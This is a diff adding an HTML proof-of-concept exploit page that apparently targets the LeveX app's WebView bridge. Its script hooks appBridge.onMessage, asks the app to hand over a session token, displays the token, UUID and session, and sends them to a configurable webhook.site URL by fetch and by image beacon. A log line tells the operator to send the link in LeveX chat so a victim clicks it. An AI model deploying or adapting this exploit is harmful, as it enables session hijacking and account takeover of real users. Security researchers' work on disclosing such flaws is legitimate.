@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>LeveX Security Research</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Courier New', monospace;
+      background: #0a0a0a;
+      color: #d0d0d0;
+      padding: 16px;
+      font-size: 14px;
+    }
+    h1 { color: #ff4444; font-size: 18px; margin-bottom: 16px; border-bottom: 1px solid #333; padding-bottom: 8px; }
+    .box {
+      border-radius: 4px;
+      padding: 12px 14px;
+      margin: 10px 0;
+      word-break: break-all;
+    }
+    .info  { background: #0d1a2e; border-left: 4px solid #2196f3; }
+    .ok    { background: #0d2010; border-left: 4px solid #4caf50; }
+    .warn  { background: #2a1f00; border-left: 4px solid #ff9800; }
+    .CRIT  {
+      background: #2a0000;
+      border: 2px solid #ff1111;
+      padding: 16px;
+      margin: 14px 0;
+      border-radius: 4px;
+    }
+    .CRIT .label {
+      color: #ff4444;
+      font-size: 13px;
+      font-weight: bold;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      margin-bottom: 8px;
+    }
+    .token-val {
+      color: #ffeb3b;
+      font-size: 13px;
+      background: #111;
+      padding: 8px;
+      border-radius: 3px;
+      margin-top: 6px;
+      word-break: break-all;
+    }
+    .field { color: #aaa; font-size: 12px; margin-top: 6px; }
+    .field span { color: #e0e0e0; }
+    .ts { color: #555; font-size: 11px; }
+    #status-bar {
+      position: fixed;
+      top: 0; left: 0; right: 0;
+      background: #1a0000;
+      color: #ff4444;
+      text-align: center;
+      padding: 6px;
+      font-size: 13px;
+      font-weight: bold;
+      display: none;
+      z-index: 999;
+    }
+    #status-bar.show { display: block; }
+  </style>
+</head>
+<body>
+
+<div id="status-bar" id="sb">⚠️ TOKEN CAPTURED — SEE BELOW</div>
+
+<h1>LeveX / WebView Security PoC</h1>
+
+<div id="log"></div>
+
+<script>
+// ─────────────────────────────────────────────────────────────────────────────
+// CONFIG — replace with your actual webhook.site URL before hosting
+// ─────────────────────────────────────────────────────────────────────────────
+var WEBHOOK = "https://webhook.site/REPLACE-WITH-YOUR-UUID";
+// ─────────────────────────────────────────────────────────────────────────────
+
+var logEl = document.getElementById('log');
+
+function ts() {
+  return new Date().toISOString();
+}
+
+function log(html, cls) {
+  var d = document.createElement('div');
+  d.className = 'box ' + (cls || 'info');
+  d.innerHTML = '<span class="ts">' + ts() + '</span><br>' + html;
+  logEl.appendChild(d);
+  window.scrollTo(0, document.body.scrollHeight);
+}
+
+// ── Send stolen data to webhook (server-side proof) ──────────────────────────
+function exfil(data) {
+  var payload = JSON.stringify(data);
+
+  // Method 1: fetch (preferred)
+  try {
+    fetch(WEBHOOK, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: payload
+    });
+  } catch(e) {}
+
+  // Method 2: image beacon fallback
+  try {
+    var encoded = encodeURIComponent(payload);
+    new Image().src = WEBHOOK + '?d=' + encoded.substring(0, 1800);
+  } catch(e) {}
+}
+
+// ── Main capture callback ─────────────────────────────────────────────────────
+function installHook() {
+  // Save original if present
+  var orig = (window.appBridge && typeof window.appBridge.onMessage === 'function')
+             ? window.appBridge.onMessage
+             : null;
+
+  window.appBridge.onMessage = function(rawJson) {
+    log('appBridge.onMessage() fired', 'ok');
+
+    var obj, payload, token, uuid, version, session, lang;
+
+    try {
+      obj = JSON.parse(rawJson);
+
+      // Handle both flat and nested payload structures
+      payload  = obj.payload  || obj;
+      token    = payload.token          || payload['token']      || '[not found]';
+      uuid     = payload['x-lx-uuid']  || payload.uuid          || '[not found]';
+      version  = payload.version        || '[not found]';
+      session  = payload.session        || '[not found]';
+      lang     = payload.lang           || '[not found]';
+
+    } catch(e) {
+      log('JSON parse error: ' + e.message, 'warn');
+      log('Raw: ' + rawJson, 'warn');
+      return;
+    }
+
+    // ── Show on screen ────────────────────────────────────────────────────────
+    document.getElementById('status-bar').className = 'show';
+
+    var html =
+      '<div class="label">🔴 SESSION TOKEN CAPTURED</div>' +
+      '<div class="field">token:</div>'   +
+      '<div class="token-val">' + token   + '</div>' +
+      '<div class="field">x-lx-uuid: <span>' + uuid    + '</span></div>' +
+      '<div class="field">version:   <span>' + version + '</span></div>' +
+      '<div class="field">session:   <span>' + session + '</span></div>' +
+      '<div class="field">lang:      <span>' + lang    + '</span></div>' +
+      '<div class="field" style="margin-top:10px">raw JSON:</div>' +
+      '<div class="token-val" style="font-size:11px">' + rawJson + '</div>';
+
+    log(html, 'CRIT');
+
+    // ── Exfiltrate to attacker server ────────────────────────────────────────
+    exfil({
+      captured_at : ts(),
+      origin      : window.location.href,
+      token       : token,
+      uuid        : uuid,
+      version     : version,
+      session     : session,
+      lang        : lang,
+      raw         : rawJson
+    });
+
+    log('Exfil sent → ' + WEBHOOK, 'warn');
+
+    // Call original handler if one existed
+    if (typeof orig === 'function') { orig.call(window.appBridge, rawJson); }
+  };
+}
+
+// ── Fire WebPageReady to request the token ───────────────────────────────────
+function triggerWebPageReady() {
+  try {
+    var msg = JSON.stringify({ type: 'WebPageReady', id: 1 });
+    window.appBridge.postMessage(msg);
+    log('WebPageReady sent → waiting for token callback…', 'ok');
+  } catch(e) {
+    log('postMessage error: ' + e.message, 'warn');
+  }
+}
+
+// ── Entry point ───────────────────────────────────────────────────────────────
+(function run() {
+  log('Page loaded · origin: ' + window.location.origin, 'info');
+  log('User-Agent: ' + navigator.userAgent, 'info');
+
+  var found = (typeof window.appBridge !== 'undefined' &&
+               typeof window.appBridge.postMessage === 'function');
+
+  log('appBridge present at page load: ' + found, found ? 'ok' : 'warn');
+
+  if (found) {
+    installHook();
+    triggerWebPageReady();
+  } else {
+    log('Polling for appBridge (up to 5 s)…', 'info');
+    var attempts = 0;
+    var iv = setInterval(function() {
+      attempts++;
+      if (typeof window.appBridge !== 'undefined' &&
+          typeof window.appBridge.postMessage === 'function') {
+        clearInterval(iv);
+        log('appBridge found after ' + (attempts * 300) + ' ms', 'ok');
+        installHook();
+        triggerWebPageReady();
+      } else if (attempts >= 17) {           // ~5 s
+        clearInterval(iv);
+        log('appBridge NOT found — page is not running inside LeveX WebView.', 'warn');
+        log('Trigger: send this URL in LeveX chat and have victim click it.', 'info');
+      }
+    }, 300);
+  }
+})();
+</script>
+
+</body>
+</html>
